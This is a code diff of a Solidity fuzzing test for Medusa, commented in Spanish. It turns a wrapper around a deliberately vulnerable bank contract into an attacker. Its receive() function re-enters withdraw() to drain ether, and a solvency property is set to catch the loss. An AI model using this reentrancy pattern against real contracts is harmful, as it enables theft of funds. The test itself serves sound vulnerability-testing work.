@@ -3,42 +3,41 @@ pragma solidity 0.8.13;
 
 import "./Reentrancy.sol";
 
-// Un contrato de prueba "natural" para Medusa
-// No incluye lógica de ataque hardcodeada, deja que el fuzzer descubra asincronías.
+// Contrato de prueba para Medusa que actúa como Atacante
 contract ReentrancyMedusa {
     VulnerableBank public bank;
-
-    uint256 public totalDeposits;
+    uint256 public totalDeposited;
 
     constructor() {
         bank = new VulnerableBank();
     }
 
-    // Envoltorio natural para simular depósitos generales
+    // Proxy: Medusa inyecta su propio dinero aleatorio
     function deposit() public payable {
         bank.deposit{value: msg.value}();
-        totalDeposits += msg.value;
+        totalDeposited += msg.value;
     }
 
-    // Envoltorio natural para que la herramienta intente retirar
+    // Proxy: Medusa retira
     function withdraw() public {
-        // Obtenemos el balance antes para saber si debiera fallar o no
         uint256 bal = bank.balances(address(this));
         if (bal > 0) {
             bank.withdraw();
-            // Actualizamos la contabilidad si fue exitoso (en un entorno sin vulnerabilidad)
-            totalDeposits -= bal;
-        } else {
-            // Intentar retirar sin balance, natural fuzzing
-            try bank.withdraw() {} catch {}
+            totalDeposited -= bal;
         }
     }
 
-    // PROPIEDAD NATURAL: El balance real del banco nunca debe ser menor
-    // a los depósitos registrados.
-    // Si Medusa (u otro fuzzer avanzado) implementa re-entradas estándar en sus callers,
-    // el banco enviará ETH y no restará el balance hasta el final, filtrando ETH real vs contable.
+    // LA TRAMPA: Reentrada asíncrona
+    receive() external payable {
+        if (address(bank).balance > 0) {
+            bank.withdraw(); 
+        }
+    }
+
+    // PROPIEDAD DE SEGURIDAD MÁXIMA PARA MEDUSA
+    // Regla: "El balance del banco NUNCA debe ser inferior a lo que Medusa depositó"
+    // (Medusa fallará aquí reportando la vulnerabilidad: robará su propio dinero sin que 'totalDeposited' se reste)
     function property_solvency() public view returns (bool) {
-        return address(bank).balance >= totalDeposits;
+        return address(bank).balance >= totalDeposited;
     }
 }
